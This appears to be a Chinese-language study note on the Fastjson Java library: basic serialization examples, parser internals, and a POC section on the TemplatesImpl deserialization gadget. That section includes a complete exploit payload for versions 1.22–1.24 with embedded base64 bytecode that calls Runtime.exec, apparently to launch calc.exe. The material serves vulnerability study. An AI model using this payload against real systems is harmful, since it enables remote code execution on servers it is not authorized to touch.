[TOC]

# FastJson

## 用法

先定义一个User类。

```java
package data;

public class User {
    private String name;
    private int age;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```

然后进行Fastjson的使用。

```java
package com.example.testfastjson.controller;

import java.util.HashMap;
import java.util.Map;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class TestFastjson {

    public static void main(String[] args) {
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("key1", "One");
        map.put("key2", "Two");
        String mapJson = JSON.toJSONString(map);
        System.out.println(mapJson);

        User user1 = new User();
        user1.setName("xiaoming");
        user1.setAge(5);
        System.out.println("obj name:" + user1.getClass().getName());

        // 序列化
        String serializedStr = JSON.toJSONString(user1);
        System.out.println("serializedStr=" + serializedStr);

        String serializedStr1 = JSON.toJSONString(user1, SerializerFeature.WriteClassName);
        System.out.println("serializedStr1=" + serializedStr1);

        // 通过parse方法进行反序列化
        User user2 = (User) JSON.parse(serializedStr1);
        System.out.println(user2.getName());
        System.out.println();

        // 通过parseObject方法进行反序列化  通过这种方法返回的是一个JSONObject
        Object obj = JSON.parseObject(serializedStr1);
        System.out.println(obj);
        System.out.println("obj name:" + obj.getClass().getName() + "\n");

        // 通过这种方式返回的是一个相应的类对象
        Object obj1 = JSON.parseObject(serializedStr1, Object.class);
        System.out.println(obj1);
        System.out.println("obj1 name:" + obj1.getClass().getName());

    }
}
```

结果：

```
{"key1":"One","key2":"Two"}
obj name:com.example.testfastjson.controller.User
serializedStr={"age":5,"name":"xiaoming"}
serializedStr1={"@type":"com.example.testfastjson.controller.User","age":5,"name":"xiaoming"}
xiaoming

{"name":"xiaoming","age":5}
obj name:com.alibaba.fastjson.JSONObject

com.example.testfastjson.controller.User@73a8dfcc
obj1 name:com.example.testfastjson.controller.User
```

## 变量含义

```
text：json文本数据
len：json文本数据长度
token：代表解析到的这一段数据的类型
ch：当前读取到的字符
bp：当前字符索引
sbuf：正在解析段的数据，char数组
sp：sbuf最后一个数据的索引
hasSpecial=false：需要初始化或者扩容sbuf
```

## POC

**@type**

> 指定的解析类，即`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在poc中，`_bytecodes`与`_name`都是私有属性，所以要想反序列化这两个，需要在`parseObject()`时设置`Feature.SupportNonPublicField`

**_bytecodes**

> 是我们把恶意类的.class文件二进制格式进行base64编码后得到的字符串

**_outputProperties**

> 漏洞利用链的关键会调用其参数的getOutputProperties方法 导致命令执行

**_tfactory:{}**

> 在defineTransletClasses()时会调用getExternalExtensionsMap(),当为null时会报错，所以要对_tfactory 设值

**V1.22-1.24**

> ```
> String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQANAoAAgADBwAEDAAFAAYBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEACGNhbGMuZXhlCgAIABAMABEAEgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsHABQBABpvcmcvam95Y2hvdS9jb250cm9sbGVyL3BvYwoAEwADAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMb3JnL2pveWNob3UvY29udHJvbGxlci9wb2M7AQAKRXhjZXB0aW9ucwcAHQEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAJaGFGbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAqAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAKU291cmNlRmlsZQEACHBvYy5qYXZhACEAEwACAAAAAAAEAAEABQAGAAIAFgAAAEAAAgABAAAADiq3AAG4AAcSDbYAD1exAAAAAgAXAAAADgADAAAADQAEAA4ADQAPABgAAAAMAAEAAAAOABkAGgAAABsAAAAEAAEAHAABAB4AHwABABYAAABJAAAABAAAAAGxAAAAAgAXAAAABgABAAAAEwAYAAAAKgAEAAAAAQAZABoAAAAAAAEAIAAhAAEAAAABACIAIwACAAAAAQAkACUAAwABAB4AJgACABYAAAA/AAAAAwAAAAGxAAAAAgAXAAAABgABAAAAGAAYAAAAIAADAAAAAQAZABoAAAAAAAEAIAAhAAEAAAABACcAKAACABsAAAAEAAEAKQAJACsALAACABYAAABBAAIAAgAAAAm7ABNZtwAVTLEAAAACABcAAAAKAAIAAAAbAAgAHAAYAAAAFgACAAAACQAtAC4AAAAIAAEALwAaAAEAGwAAAAQAAQAwAAEAMgAAAAIAMw==\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";
> ```

